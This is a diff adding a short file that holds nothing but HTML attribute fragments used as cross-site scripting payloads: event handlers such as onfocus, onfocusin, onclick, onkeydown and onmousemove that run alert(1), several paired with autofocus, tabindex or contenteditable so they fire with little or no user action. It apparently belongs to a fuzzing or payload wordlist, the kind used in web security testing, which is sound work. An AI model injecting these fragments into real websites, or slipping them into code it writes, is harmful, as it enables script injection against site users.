@@ -1,0 +1,16 @@
+autofocus onfocus=alert(1)
+autofocus onfocus=alert(1) href
+autofocus onfocusin=alert(1) href
+id=x tabindex=1 onfocus=alert(1)
+id=x tabindex=1 onfocusin=alert(1)
+onbeforecopy="alert(1)" contenteditable
+onbeforecut="alert(1)" contenteditable
+onblur=alert(1) tabindex=1 id=x
+onclick="alert(1)"
+oncontextmenu="alert(1)"
+ondblclick="alert(1)" autofocus tabindex=1
+onfocusout=alert(1) tabindex=1 id=x
+onkeydown="alert(1)" contenteditable
+onkeypress="alert(1)" contenteditable
+onkeyup="alert(1)" contenteditable
+onmousemove=alert(1)
